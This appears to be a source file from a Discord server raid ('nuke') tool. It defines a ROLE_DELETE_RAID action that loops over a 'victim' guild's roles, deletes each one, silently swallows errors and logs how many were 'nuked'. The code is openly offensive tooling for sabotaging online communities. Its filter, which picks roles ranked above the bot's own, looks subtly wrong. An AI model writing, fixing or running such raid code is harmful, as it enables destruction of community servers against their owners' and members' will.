import chalk from 'chalk';
import { Log, spinner } from './../utils/index.js';
const roleDeleteRaid = {
    name: 'ROLE_DELETE_RAID',
    id: 2,
    permission: 'MANAGE_ROLES',
    async execute(victimGuild) {
        const _spinner = spinner(`Nuking role: `).start();
        let nukedCount = 0;
        const victimRoles = victimGuild.roles.cache.filter(role => role.comparePositionTo(victimGuild.me.roles.highest) > 0);
        for (const victimRole of victimRoles.values())
            try {
                _spinner.text = `Nuking role: ${victimRole.name}`;
                await victimRole.delete();
                nukedCount++;
            }
            catch (error) { } // Digest all errors... nom nom nom
        _spinner.stop();
        Log.success(`Nuked ${chalk.bold(`${nukedCount} roles`)}`);
    },
};
export default roleDeleteRaid;
